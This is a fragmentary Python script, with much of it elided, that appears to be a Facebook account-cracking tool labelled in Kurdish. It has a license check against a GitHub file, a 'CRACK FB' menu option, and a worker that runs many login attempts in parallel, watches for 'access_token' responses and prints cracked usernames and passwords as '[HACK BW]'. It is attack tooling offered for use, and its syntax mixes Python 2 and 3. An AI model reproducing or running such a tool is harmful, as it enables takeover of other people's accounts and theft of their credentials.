...
def chk():
  ...
  try:
    httpCaht = requests.get("https://github.com/999ah/Id/blob/main/Id%20active.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram dlm.......")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
logo = logo ="""
        ...
        chanalm:the me
   $    nrxamtoola:10$
   $     CRACKED BY THE WLKING
   $
   $
====================%%%%%%=======

==============================
bashrin tool ka taesa bardast Be
==============================
"""
back = 0
successful = []
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m-'
    print '\x1b[1;92m[1]\x1b[1;92m CRACK FB'
...
def action():
    ...
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Tkaya Chawarwan Ba ...')
    time.sleep(0.1)
    ...
    def main(dla):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;97m[HACK BW]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\n'
    ...
    p.map(main, id)
    print 42 * '\x1b[1;97m='
    print '[\xe2\x9c\x93]\x1b[1;93m HACK TAWAW BO ATWANI ....'
